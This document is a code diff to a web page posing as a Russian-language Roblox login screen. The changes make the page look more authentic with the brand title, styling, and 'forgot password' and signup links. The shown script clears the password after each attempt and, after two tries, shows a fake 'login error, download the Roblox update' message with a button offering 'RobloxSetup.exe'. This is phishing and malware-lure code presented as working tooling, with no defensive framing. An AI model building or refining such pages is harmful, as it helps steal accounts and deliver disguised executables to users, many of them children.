@@ -25,8 +25,9 @@ def index():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Войти в Roblox</title>
+        <title>Roblox</title>
         <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
                 background: #0a0a1a;
                 font-family: Arial, sans-serif;
@@ -36,41 +37,82 @@ def index():
                 height: 100vh;
                 margin: 0;
             }
-            .login-form {
+            .login-container {
                 background: #14142a;
-                padding: 30px;
-                border-radius: 12px;
-                width: 340px;
-                color: white;
+                padding: 40px 30px 30px;
+                border-radius: 16px;
+                width: 360px;
                 text-align: center;
+                box-shadow: 0 8px 30px rgba(0,0,0,0.8);
             }
-            .login-form input {
+            .login-container h1 {
+                color: #fff;
+                font-size: 26px;
+                font-weight: 500;
+                margin-bottom: 25px;
+            }
+            .login-container input {
                 width: 100%;
-                padding: 12px;
+                padding: 14px 16px;
                 margin: 8px 0;
                 background: #0a0a1a;
                 border: 1px solid #2a2a4a;
                 border-radius: 8px;
                 color: white;
+                font-size: 16px;
+                outline: none;
                 box-sizing: border-box;
             }
-            .login-form button {
+            .login-container input:focus {
+                border-color: #00bfff;
+            }
+            .login-container button {
                 width: 100%;
-                padding: 12px;
+                padding: 14px;
                 background: #00bfff;
                 color: white;
                 border: none;
                 border-radius: 8px;
+                font-size: 18px;
                 font-weight: bold;
                 cursor: pointer;
+                margin-top: 12px;
+                transition: background 0.2s;
             }
-            .login-form button:hover {
+            .login-container button:hover {
                 background: #009acd;
+            }
+            .login-container .links {
+                margin-top: 18px;
+                font-size: 14px;
+                color: #6a8aae;
+                display: flex;
+                flex-direction: column;
+                gap: 6px;
+            }
+            .login-container .links a {
+                color: #00bfff;
+                text-decoration: none;
+            }
+            .login-container .links a:hover {
+                text-decoration: underline;
+            }
+            .login-container .signup {
+                margin-top: 12px;
+                color: #6a8aae;
+                font-size: 14px;
+            }
+            .login-container .signup a {
+                color: #00bfff;
+                text-decoration: none;
+            }
+            .login-container .signup a:hover {
+                text-decoration: underline;
             }
             .download-btn {
                 display: none;
-                margin-top: 15px;
-                padding: 12px;
+                margin-top: 20px;
+                padding: 14px;
                 background: #00b894;
                 color: white;
                 border: none;
@@ -78,19 +120,21 @@ def index():
                 font-weight: bold;
                 cursor: pointer;
                 width: 100%;
+                font-size: 16px;
             }
             .download-btn:hover {
                 background: #00a381;
             }
             .error-message {
                 color: #ff6b6b;
-                margin-top: 10px;
+                margin-top: 12px;
                 font-size: 14px;
+                min-height: 20px;
             }
         </style>
     </head>
     <body>
-        <div class="login-form">
+        <div class="login-container">
             <h1>Войти в Roblox</h1>
             <form id="loginForm">
                 <input type="text" id="username" placeholder="Имя пользователя" required>
@@ -98,6 +142,13 @@ def index():
                 <button type="submit">Войти</button>
             </form>
             <div id="message" class="error-message"></div>
+            <div class="links">
+                <a href="#">Забыли пароль?</a>
+                <a href="#">Войти по коду</a>
+            </div>
+            <div class="signup">
+                Нет аккаунта? <a href="#">Зарегистрироваться</a>
+            </div>
             <button class="download-btn" id="downloadBtn">⬇️ Скачать RobloxSetup.exe</button>
         </div>
 
@@ -128,7 +179,7 @@ def index():
                 document.getElementById('password').value = '';
 
                 if (attempts >= 2) {
-                    document.getElementById('message').innerHTML = '⚠️ Обнаружена проблема с входом. Скачайте обновление Roblox.';
+                    document.getElementById('message').innerHTML = '⚠️ Ошибка входа. Скачайте обновление Roblox.';
                     document.getElementById('downloadBtn').style.display = 'block';
                 }
             });
